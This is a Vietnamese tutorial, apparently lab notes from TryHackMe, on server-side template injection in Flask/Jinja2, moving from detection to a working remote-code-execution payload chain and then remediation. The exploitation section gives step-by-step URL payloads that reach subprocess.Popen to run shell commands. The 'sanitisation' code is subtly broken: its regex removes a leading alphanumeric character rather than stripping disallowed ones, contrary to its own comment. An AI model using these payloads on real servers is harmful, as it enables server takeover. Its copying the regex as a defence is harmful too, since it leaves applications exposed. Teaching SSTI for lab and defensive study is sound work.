# SSTI basic 1

## I . Introduction

#### Server Side Template Injection là gì?

**Server Side Template Injection (SSTI)** là một kiểu khai thác lỗ hổng trên web, lợi dụng việc lập trình viên triển khai một công cụ mẫu (template engine) không an toàn.

***

#### Template engine là gì?

Một **template engine** cho phép bạn tạo ra các tệp mẫu tĩnh (static template files) có thể được tái sử dụng trong ứng dụng của bạn.

***

#### Điều đó có nghĩa là gì?

Xem xét một trang web lưu trữ thông tin về người dùng, ví dụ `/profile/<user>`. Mã nguồn có thể trông như sau trong Flask (Python):

```python
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"
    return render_template_string(template)

app.run()
```

Đoạn mã này tạo ra một chuỗi mẫu (template string), sau đó nối đầu vào của người dùng vào đó. Cách này cho phép nội dung được tải động cho từng người dùng, đồng thời giữ nguyên định dạng trang.

**Lưu ý**: Flask là một framework web, trong khi **Jinja2** là template engine được sử dụng trong ví dụ này.

***

#### SSTI bị khai thác như thế nào?

Xem xét đoạn mã trên, đặc biệt là chuỗi mẫu. Biến `user` (là dữ liệu đầu vào từ người dùng) được nối trực tiếp vào chuỗi mẫu, thay vì được truyền vào như một biến dữ liệu. Điều này đồng nghĩa với việc bất cứ thứ gì được cung cấp từ đầu vào của người dùng sẽ được template engine diễn giải và thực thi.

**Lưu ý**: Lỗi không nằm ở template engine, mà là ở cách triển khai không an toàn của lập trình viên.

***

#### Tác động của SSTI là gì?

Đúng như tên gọi, SSTI là một lỗ hổng **phía máy chủ (server-side)**, khác với các lỗi phía trình duyệt (client-side) như **cross-site scripting (XSS)**.

Điều này khiến lỗ hổng trở nên **nghiêm trọng hơn**, bởi vì thay vì một tài khoản người dùng trên website bị chiếm quyền (như trong XSS), thì **toàn bộ máy chủ** có thể bị chiếm quyền kiểm soát.

Hậu quả có thể rất đa dạng, nhưng mục tiêu phổ biến nhất là đạt được **khả năng thực thi mã từ xa (remote code execution)**.



## II . Detection



#### Tìm điểm chèn (injection point)

Để thực hiện khai thác, ta cần **chèn payload vào một vị trí nào đó** trong ứng dụng — vị trí này được gọi là **điểm chèn (injection point)**.

Có một số vị trí thường được kiểm tra trong ứng dụng, chẳng hạn như:

* Trên thanh địa chỉ URL
* Trong các hộp nhập liệu (input box)
* Đừng quên kiểm tra cả những **trường nhập liệu ẩn (hidden inputs)**

Trong ví dụ này, có một trang lưu trữ thông tin người dùng tại địa chỉ:\
[**http://10.201.44.20:5000/profile/**](http://10.201.44.20:5000/profile/)**\<user>**\
Trang này nhận đầu vào từ người dùng.

<figure><img src="../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

Ta có thể xác định đầu ra dự kiến bằng cách cung cấp một tên thông thường, ví dụ:

```
http://10.201.44.20:5000/profile/Jake
```

Trang sẽ trả về:

```
Welcome to the profile of Jake!
```

***

#### Fuzzing

**Fuzzing** là một kỹ thuật nhằm xác định xem máy chủ có tồn tại lỗ hổng hay không, bằng cách gửi hàng loạt ký tự với hy vọng **gây ảnh hưởng hoặc làm rối hệ thống phía backend**.

Việc fuzzing có thể được thực hiện:

* **Thủ công**
* **Tự động** thông qua các công cụ như **Intruder** trong **Burp Suite**

Tuy nhiên, trong mục đích giáo dục, ta sẽ xét đến quá trình **fuzzing thủ công**.

May mắn là hầu hết các **template engine** đều sử dụng **tập ký tự đặc biệt tương tự nhau** cho các chức năng đặc biệt (special functions), do đó việc phát hiện khả năng tồn tại SSTI tương đối nhanh chóng.

Ví dụ, những ký tự sau đây thường được sử dụng trong nhiều template engine:

```
${{<%[%'"}}%
```

Để fuzz thủ công tất cả các ký tự này, ta có thể **gửi từng ký tự một**, theo thứ tự nối tiếp nhau.

<figure><img src="../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

Quy trình fuzz thủ công diễn ra như sau:

*   Truy cập lần lượt các URL như:

    ```
    http://10.201.44.20:5000/profile/${  
    http://10.201.44.20:5000/profile/{{  
    http://10.201.44.20:5000/profile/<  
    ...
    ```
* Sau mỗi lần gửi, quan sát phản hồi:
  * Nếu có lỗi hiện ra (500 Internal Server Error)
  * Hoặc nếu một số ký tự bị **biến mất khỏi đầu ra** (ví dụ, chỉ hiện “Welcome to the profile of” mà thiếu phần ký tự nhập vào)

Thì có thể kết luận rằng template engine **đang xử lý** đầu vào — dấu hiệu cho thấy có khả năng tồn tại SSTI.



## III . Identification

#### Xác định template engine

Sau khi đã phát hiện được những ký tự nào khiến ứng dụng trả lỗi, bước tiếp theo là **xác định loại template engine** mà ứng dụng đang sử dụng.

**Trường hợp lý tưởng:**

Nếu ứng dụng hiển thị **thông báo lỗi (error message)** và trong đó có đề cập đến tên của template engine (ví dụ: `jinja2.exceptions.TemplateSyntaxError`), thì ta có thể **xác nhận ngay lập tức** — và **bước này hoàn tất**.

**Trường hợp không có thông báo lỗi rõ ràng:**

Khi không có thông báo lỗi cụ thể, ta có thể sử dụng một **cây quyết định (decision tree)** để lần lượt thử các payload và **suy luận ra template engine dựa trên cách phản hồi của ứng dụng**.

<figure><img src="../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

#### Cách sử dụng cây quyết định

1. **Bắt đầu từ bên trái của cây quyết định**.
2. Gửi một yêu cầu chứa **biểu thức kiểm tra (test expression)**.
3. Theo dõi cách ứng dụng phản hồi:
   * **Mũi tên màu xanh lá**: Nếu **biểu thức được tính toán ra kết quả**, ví dụ trả về `49` thay vì hiển thị `{{7*7}}`, thì **đi theo nhánh màu xanh**.
   * **Mũi tên màu đỏ**: Nếu **biểu thức được hiển thị nguyên dạng**, ví dụ trả lại `{{7*7}}`, thì **đi theo nhánh màu đỏ**.
4. **Tiếp tục làm theo từng bước của cây quyết định**, cho đến khi đến được lá cuối cùng — nơi xác định tên cụ thể của template engine (ví dụ: Jinja2, Velocity, Freemarker...).



VD :&#x20;



<figure><img src="../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

The application mirrors the user input, so we follow the red arrow:

<figure><img src="../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>



## IV . Syntax

[document](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment)

#### Sau khi xác định được template engine, bước tiếp theo là tìm hiểu cú pháp của nó.

Và không có nơi nào tốt hơn để học điều này ngoài **tài liệu chính thức** của template engine đó.

***

**Dù là ngôn ngữ lập trình hay template engine nào**, bạn luôn cần tìm hiểu các yếu tố sau:

* Cách bắt đầu một câu lệnh in (print statement)
* Cách kết thúc một câu lệnh in
* Cách bắt đầu một khối lệnh (block statement)
* Cách kết thúc một khối lệnh

***

**Trong ví dụ của chúng ta**, tài liệu của template engine nêu rõ như sau:

* `{{` – Dùng để đánh dấu **bắt đầu một câu lệnh in**
* `}}` – Dùng để đánh dấu **kết thúc một câu lệnh in**
* `{%` – Dùng để đánh dấu **bắt đầu một khối lệnh**
* `%}` – Dùng để đánh dấu **kết thúc một khối lệnh**



## V . Exploitation

#### Tại thời điểm này, chúng ta đã biết:

* Ứng dụng có lỗ hổng SSTI
* Vị trí chèn (injection point)
* Template engine được sử dụng
* Cú pháp của template engine

***

#### Lập kế hoạch

Trước tiên, hãy lập kế hoạch cách chúng ta sẽ khai thác lỗ hổng này.

Vì **Jinja2** là một template engine dựa trên **Python**, chúng ta sẽ tìm cách để thực thi các lệnh shell trong Python. Một tìm kiếm nhanh trên Google đưa ra một bài viết mô tả chi tiết các cách khác nhau để chạy lệnh shell. Dưới đây là một vài phương pháp được trích dẫn:

[document kèm theo ](https://janakiev.com/blog/python-shell-commands/)

```python
# Phương pháp 1
import os
os.system("whoami")

# Phương pháp 2
import os
os.popen("whoami").read()

# Phương pháp 3
import subprocess
subprocess.Popen("whoami", shell=True, stdout=-1).communicate()
```

***

#### Tạo một proof of concept (POC) — Tổng quát

Kết hợp tất cả kiến thức trên, chúng ta có thể xây dựng một **proof of concept (POC)**.

Payload sau đây sử dụng cú pháp mà chúng ta đã thu được từ Task 4, và các lệnh shell bên trên, để tạo ra một biểu thức mà template engine có thể xử lý:

```
http://10.201.44.20:5000/profile/{% import os %}{{ os.system("whoami") }}
```

**Lưu ý**: Jinja2 về bản chất là một ngôn ngữ con của Python nhưng **không hỗ trợ câu lệnh import**, vì vậy đoạn trên **không hoạt động**.

***

#### Tạo proof of concept (POC) — Dành riêng cho Jinja2

Python cho phép chúng ta gọi instance của class hiện tại bằng `. __class__`. Ta có thể gọi điều này trên một chuỗi rỗng:

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__ }}
```

Các class trong Python có một thuộc tính `. __mro__` cho phép ta **truy ngược lên cây kế thừa của object**:

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__.__mro__ }}
```

Vì chúng ta muốn object gốc (root object), ta có thể truy cập phần tử thứ hai (chỉ mục 1):

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__.__mro__[1] }}
```

Các object trong Python có một phương thức gọi là `. __subclasses__()` cho phép ta **truy xuống cây kế thừa**:

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Bây giờ, chúng ta cần tìm một object cho phép thực thi lệnh shell. Khi sử dụng Ctrl+F để tìm kiếm trong danh sách các module ở kết quả trên, ta có một kết quả phù hợp:

<figure><img src="../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Vì toàn bộ đầu ra ở trên chỉ là một **danh sách trong Python**, chúng ta có thể truy cập nó bằng **chỉ số (index)**. Bạn có thể tìm chỉ số này bằng cách **thử và sai**, hoặc bằng cách **đếm vị trí trong danh sách**.

Trong ví dụ này, vị trí trong danh sách là **400** (chỉ số 401):

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}
```

Payload trên thực chất gọi đến phương thức **subprocess.Popen**, và bây giờ tất cả những gì chúng ta cần làm là gọi nó (sử dụng cú pháp ở đoạn code trước):

**Payload**:

```
http://10.201.44.20:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
```

***

#### Tìm payloads

Quy trình xây dựng một payload sẽ mất một chút thời gian khi bạn làm lần đầu tiên, tuy nhiên việc **hiểu rõ tại sao nó hoạt động** là rất quan trọng.

Để tham khảo nhanh, đã có một repo trên GitHub được tạo ra như một **cheatsheet** cho payloads của mọi lỗ hổng web, bao gồm cả **SSTI**.

[payloadallthething](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)



## VI . Examination



Bây giờ, sau khi đã khai thác được ứng dụng, hãy cùng xem **chính xác điều gì đã xảy ra khi payload được chèn vào**.

Đoạn mã mà chúng ta đã khai thác giống hệt như đã được trình bày trong **Task 1**:

```python
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"

    return render_template_string(template)

app.run()
```

***

Hãy tưởng tượng điều này giống như một quá trình **tìm kiếm và thay thế (find and replace)**.

Xem đoạn code dưới đây để thấy chính xác cách nó hoạt động:

```python
# Code gốc
template = f"<h1>Welcome to the profile of {user}!</h1>"

# Code sau khi chèn đầu vào: TryHackMe
template = f"<h1>Welcome to the profile of TryHackMe!</h1>"

# Code sau khi chèn đầu vào: {{ 7 * 7 }}
template = f"<h1>Welcome to the profile of {{ 7 * 7 }}!</h1>"
```

***

Như chúng ta đã học ở **Task 4**, **Jinja2 sẽ đánh giá (evaluate) đoạn code nằm bên trong cặp ký tự đặc biệt** (`{{ }}` hoặc `{% %}`).\
Đây chính là lý do tại sao cuộc khai thác (exploit) lại thành công.



## VII . Remediation



Tất cả các kỹ thuật tấn công trên dẫn đến một câu hỏi: **làm thế nào để ngăn chặn điều này ngay từ đầu?**

***

#### Phương pháp an toàn

Hầu hết các template engine đều có tính năng cho phép bạn **truyền dữ liệu vào như một biến**, thay vì **nối trực tiếp dữ liệu người dùng vào trong template**.

Trong **Jinja2**, điều này có thể được thực hiện bằng cách sử dụng tham số thứ hai:

```python
# Không an toàn: Nối trực tiếp dữ liệu người dùng
template = f"<h1>Welcome to the profile of {user}!</h1>"
return render_template_string(template)

# An toàn: Truyền dữ liệu vào như biến
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```

***

#### Làm sạch dữ liệu đầu vào (Sanitisation)

**Không bao giờ được tin tưởng dữ liệu từ người dùng!**

Ở mọi nơi trong ứng dụng mà người dùng được phép thêm nội dung tùy chỉnh, cần đảm bảo rằng **dữ liệu đầu vào đã được làm sạch (sanitised)**.

Điều này có thể được thực hiện bằng cách:

1. Xác định trước tập ký tự nào bạn cho phép.
2. Thêm chúng vào **danh sách trắng (whitelist)**.

Trong Python, có thể thực hiện như sau:

```python
import re

# Loại bỏ mọi ký tự không phải chữ hoặc số
user = re.sub("^[A-Za-z0-9]", "", user)
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```

***

#### Quan trọng nhất

Hãy luôn đọc kỹ **tài liệu chính thức của template engine** mà bạn đang sử dụng.



